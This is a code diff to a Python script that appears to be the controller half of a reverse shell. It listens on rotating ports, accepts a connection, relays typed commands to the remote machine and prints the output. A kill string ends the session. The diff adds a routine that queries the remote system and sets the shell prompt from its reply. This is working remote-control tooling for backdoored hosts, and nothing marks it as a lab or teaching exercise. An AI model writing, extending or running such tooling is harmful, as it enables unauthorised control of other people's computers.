@@ -7,7 +7,9 @@ PORT = ports[0]
 BUFFER = 1024
 
 KILLSTRING = "endme"
+INFO_QUERY = "informationquery"
 
+PROMPT = "$ "
 
 def nextPort(p):
 	global ports
@@ -27,8 +29,13 @@ while True:
 			s.listen(1)
 			conn, raddr = s.accept()
 			open_conn = True
+			print("Getting system information...")
+			time.sleep(1)
+			conn.send(INFO_QUERY.encode())
+			PROMPT = conn.recv(BUFFER).decode()
+			print("Prompt set: " + PROMPT)
 
-		cmd = input("$ ")
+		cmd = input(PROMPT)
 		conn.send(cmd.encode())
 		
 		if cmd == KILLSTRING:
@@ -40,7 +47,10 @@ while True:
 			PORT = nextPort(PORT)
 		else:
 			rsp = conn.recv(BUFFER).decode()
-			print(rsp)
+			if INFO_QUERY == rsp[0:len(INFO_QUERY)]:
+				PROMPT = rsp[len(INFO_QUERY)::]
+			else:
+				print(rsp)
 	except Exception as e:
 		print(e)
 		time.sleep(1)
